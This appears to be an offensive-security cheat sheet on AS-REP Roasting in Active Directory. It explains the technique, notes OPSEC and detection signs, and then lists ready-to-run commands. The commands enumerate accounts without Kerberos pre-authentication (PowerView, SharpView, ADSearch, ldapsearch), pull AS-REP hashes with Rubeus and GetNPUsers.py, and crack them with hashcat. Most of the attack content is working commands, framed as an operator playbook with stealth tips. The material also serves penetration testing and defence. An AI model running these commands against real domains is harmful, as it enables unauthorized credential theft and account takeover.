## Information

AS-REP Roasting is a technique used to recover passwords from Active Directory accounts that have Kerberos pre-authentication disabled (`DONT_REQ_PREAUTH (0x400000 / 4194304)`). In that state, the account can request Kerberos authentication data without first proving knowledge of the password. See [T1558.004](https://attack.mitre.org/techniques/T1558/004/). AS-REP messages contain a session key encrypted with material derived from the target principal.

> Every time you request an AS-REP for a vulnerable user, the KDC generates a new ticket with a random IV (initialization vector). The `$krb5asrep$23$...` hash changes in the encrypted blob portion even for the same user. When cracked, however, the recovered password is still the same.

- [ ] OPSEC

Most detection strategies focus on unusual or anomalous ticket requests. Every AS-REP generates Event ID 4768, so a single user sending multiple AS-REQs in a short period should be investigated. Rubeus also requests RC4-encrypted tickets by default because they are easier to crack. Since modern Windows versions prefer AES128 and AES256, RC4 usage can stand out.

## Windows

1. Enumeration

```powershell
# Powerview
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

# Active Directory
Get-ADUser -Filter * -Properties DoesNotRequirePreAuth,userAccountControl | Where-Object {$_.DoesNotRequirePreAuth -eq $true} | Select-Object SamAccountName, UserPrincipalName, UserAccountControl

# With LDAP filter (more efficient)
Get-ADUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" -Properties userAccountControl | Select SamAccountName, UserPrincipalName, userAccountControl

# SharpView
.\SharpView.exe Get-DomainUser /PreauthNotRequired /Properties:samaccountname,userprincipalname

# ADSearch
.\ADSearch.exe -s "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes samaccountname,distinguishedname
```

2. Exploitation

```powershell
# OPSEC-friendly single-user request
.\Rubeus.exe asreproast /user:ada /format:hashcat /nowrap
```

3. Cracking with Hashcat

```bash
hashcat.exe -a 0 -m 18200 asrep.hash rock.list
```

## Linux

1. Enumeration

```bash
# Enumerate accounts with pre-authentication disabled
ldapsearch (userAccountControl:1.2.840.113556.1.4.803:=4194304) --attributes samaccountname,distinguishedname
```

2. Exploitation (Noisy)

```bash
GetNPUsers.py domain.local/ -dc-ip IP_DC -usersfile ad_users.txt -format john | grep -v "doesn't have"
GetNPUsers.py domain.local/ -dc-ip IP_DC -no-pass -usersfile ad_users.txt | grep -v "doesn't have"
```

3. Cracking with Hashcat

```bash
hashcat -a 0 -m 18200 asrep.hash rock.list
```
